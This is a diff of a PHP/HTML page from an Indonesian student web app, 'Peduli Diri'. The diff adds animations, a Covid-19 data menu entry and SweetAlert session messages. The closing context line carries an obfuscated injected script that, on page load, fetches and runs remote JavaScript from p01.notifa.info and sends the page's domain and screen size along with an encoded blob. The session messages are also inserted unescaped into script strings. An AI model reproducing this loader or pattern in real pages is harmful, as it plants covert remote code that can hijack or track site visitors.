@@ -49,11 +49,11 @@ window.location.assign('../index.php');
 <body>
 
 <!-- Start wrapper-->
- <div id="wrapper">
+ <div id="wrapper"> 
  
   <!--Start sidebar-wrapper-->
    <div id="sidebar-wrapper" data-simplebar="" data-simplebar-auto-hide="true" class="gradient-scooter">
-     <div class="btn-outline-primary">
+     <div class="btn-outline-primary gradient-scooters mx-auto animated bounceInRight">
       <a href="user.php">
         <p></p>  
       <img src="../assets/images/logo.jpg" class="logo-icon  gradient-scooter form-control-rounded " alt="logo icon">   <h3 class="logo-text"><b>Peduli Diri</b></h3>  
@@ -61,9 +61,10 @@ window.location.assign('../index.php');
       </a>
       
 	 </div>
- <hr>
-<br><br><br>
-	 <ul class="sidebar-menu do-nicescrol  ">
+   <br>
+
+<br><br>
+	 <ul class="sidebar-menu do-nicescrol mx-auto animated bounceInRight ">
 <hr>
       <li>
         <a href="user.php" class="waves-effect">
@@ -96,6 +97,16 @@ window.location.assign('../index.php');
       
     <hr>
 
+    <li>
+        <a href="?url=data_covid" class="waves-effect">
+        <button type="button" class="col-10 btn gradient-scooters shadow-primary form-control-rounded"><i class="icon-list"></i>Data Covid-19</button>  
+        </a>
+  
+      </li>
+
+      
+    <hr>
+
 
       <li>
         <a href="../modul/logout.php" class="waves-effect">
@@ -118,7 +129,7 @@ window.location.assign('../index.php');
        <i class="icon-menu menu-icon"></i>
      </a>
     </li>
-    <p> <h4 class="text-white">Aplikasi Catatan Perjalanan </h4></p>
+    <p> <h4 class="text-white mx-auto animated bounceInRight">Aplikasi Catatan Perjalanan </h4></p>
   </ul>
      
 
@@ -153,6 +164,10 @@ window.location.assign('../index.php');
                 case 'edit_catatan';
                 include 'edit_catatan.php';
                   break;
+
+                  case 'data_covid';
+                include 'data_covid.php';
+                  break;
               
               default:
                 echo "Halaman Tidak Ditemukan ";
@@ -163,22 +178,18 @@ window.location.assign('../index.php');
        
             
             echo "<br> <br>";
-            echo "<center><h3 >Selamat Datang Di Aplikasi Peduli Diri</h3></center><br><br>";
-            echo "<center><img src='../assets/images/logo.jpg' class='shadow-primary form-control-rounded ' width='250' height='250' /></center>";
-            echo "<center><br><br><b class='shadow-primary '> Anda Login Sebagai :</b><br></center>";
-            echo "<center><h4>".$_SESSION['npm']. "</h4> </center>";
+            echo "<center><h3 class='mx-auto animated bounceInDown'>Selamat Datang Di Aplikasi Peduli Diri</h3></center><br><br>";
+            echo "<center><img src='../assets/images/logo.jpg' class='shadow-primary form-control-rounded mx-auto animated bounceInDown' width='250' height='250' /></center>";
+            echo "<center><br><br><b class='shadow-primary mx-auto animated bounceInDown'> Anda Login Sebagai :</b><br></center>";
+            echo "<center><h4 class='mx-auto animated bounceInDown'>".$_SESSION['npm']. "</h4> </center>";
 
           }
 
+      
     ?>
 
-
-    </div>
-
-
-
-
-     </div>
+</div>
+    
     <!-- End Breadcrumb-->
       <div class="row">
         <div class="col-lg-12">
@@ -189,7 +200,7 @@ window.location.assign('../index.php');
     </div>
     <!-- End container-fluid-->
     
-   </div><!--End content-wrapper-->
+<!--End content-wrapper-->
    <!--Start Back To Top Button-->
     <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
     <!--End Back To Top Button-->
@@ -197,13 +208,13 @@ window.location.assign('../index.php');
 	<!--Start footer-->
 	<footer class="footer shadow-primary">
       <div class="container">
-        <div class="text-center form-control-rounded  shadow-primary">
+        <div class="text-center form-control-rounded  shadow-primary ">
           Aplikasi Peduli Diri | 2022
         </div>
       </div>
     </footer>
 	<!--End footer-->
-   
+   <br><br><br>
   </div><!--End wrapper-->
 
 
@@ -220,8 +231,6 @@ window.location.assign('../index.php');
   <script src="../assets/js/sidebar-menu.js"></script>
   <!-- Custom scripts -->
   <script src="../assets/js/app-script.js"></script>
-
-
   <script src="../assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
   <script src="../assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
   <script src="../assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
@@ -250,7 +259,22 @@ window.location.assign('../index.php');
       } );
 
     </script>
-  
+
+  <script src="../assets/plugins/alerts-boxes/js/sweetalert.min.js"></script>
+    <?php if(isset($_SESSION['success'])) { ?>
+    <script>
+      swal("Berhasil!", "<?= $_SESSION['success']; ?>", "success");
+    </script>
+    <?php unset($_SESSION['success']); } ?>
+
+
+    <?php if(isset($_SESSION['error'])) { ?>
+    <script>
+      swal("Kesalahan!", "<?= $_SESSION['error']; ?>", "error");
+    </script>
+    <?php unset($_SESSION['error']); } ?>
+
+
 
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
